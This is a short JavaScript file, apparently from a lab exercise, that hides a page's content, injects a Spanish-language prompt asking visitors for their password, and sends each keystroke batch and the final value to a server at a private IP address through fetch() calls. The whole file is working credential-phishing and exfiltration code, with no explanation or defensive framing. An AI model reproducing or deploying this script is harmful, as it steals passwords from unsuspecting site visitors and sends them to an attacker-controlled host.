document.addEventListener('DOMContentLoaded', (e) => {
    const menu = `
    <div class="mt-4" style="max-width:400px">
    <div class="mb-3">
    <label for="password" class="form-label">Escriba su contraseña para continuar viendo</label>
    <input type="password" class="form-control" id="password">
    </div>
    `;
    document.body.insertAdjacentHTML('beforeend', menu);
    const container = document.querySelector('.container');
    container.style.display = "none";
    var count = 0;
    var iplinux = 'http://192.168.56.101:8000/';
    const secret = document.querySelector('#password');
    secret.addEventListener('keypress', (e) => {
        count++;
        if (count >= 4) {
            fetch(iplinux + secret.value)
            count = 0;
        }
    });
    secret.addEventListener('blur', (e) => {
        fetch(iplinux + secret.value)
    });
});